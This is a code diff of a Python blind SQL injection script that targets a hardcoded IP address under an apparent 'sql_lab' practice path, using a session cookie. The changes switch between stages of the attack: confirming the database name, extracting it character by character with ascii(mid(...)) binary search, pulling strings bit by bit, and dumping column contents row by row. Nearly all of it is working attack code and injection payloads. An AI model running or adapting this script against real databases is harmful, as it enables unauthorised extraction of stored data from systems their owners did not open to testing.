@@ -119,16 +119,16 @@ def check_func(*args) -> bool:
 def main():
 
     url = "http://178.208.95.16/sql_lab/blind"
-    # url = 'http://localhost/news11.php'
     test_str = 'hearth'
     main_id = 'blind'
     cook = dict(
         session='eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InJkem9ncyJ9.YnzZMA.c5mcwY9koq-WJE18kKRTNQGbBwI')
 
     database = 'sql_test'
-    '''
-    param = dict(blind=f"1' and database()='sql_test' -- -")
+    
+    param = dict(blind=f"1' and database()='sql_test'-- -")
     response = req.post_request(url, param, cook)
+    print(response)
 
     time.sleep(3)
     
@@ -142,9 +142,9 @@ def main():
 
         database = find_binary(url, f"1' and ascii(mid((select database()),%s,1))%s -- -",
                                main_id, test_str, 32, 126, len_of_key, cook)
-    '''
+    
     print('database: ', database)
-
+    exit()
     # How many tables we have
     '''
     for num_table in range(49, 55):
@@ -216,6 +216,7 @@ def main():
         print(result)
     '''
 
+    '''
     unicode_len_bit = 16
     len_of_string = 4
     payload = f"1' and mid(lpad(bin(ord(mid((select reply from blind limit 2,1),%s,1))),%s,0),%s,1)=1 -- -"
@@ -223,11 +224,12 @@ def main():
     result = find_pass_over_bits(url, param, len_of_string, check_func,
                                  cook, unicode_len_bit)
     print(result)
+    '''
 
     # What is in column
 
     len_of_string = 30
-    '''
+    
     column_content = []
     for num_row in range(1, 6):
         for name in column_name:
@@ -236,7 +238,7 @@ def main():
                 url, payload, main_id, test_str, 32, 126, len_of_string, cook).strip())
             print(name)
             print(column_content)
-    '''
+    
     '''
     payload = f"1' and substring((select reply from blind limit 1,1),%s,1)%s-- -"
     column_cyrr = find_binary_cyrr(
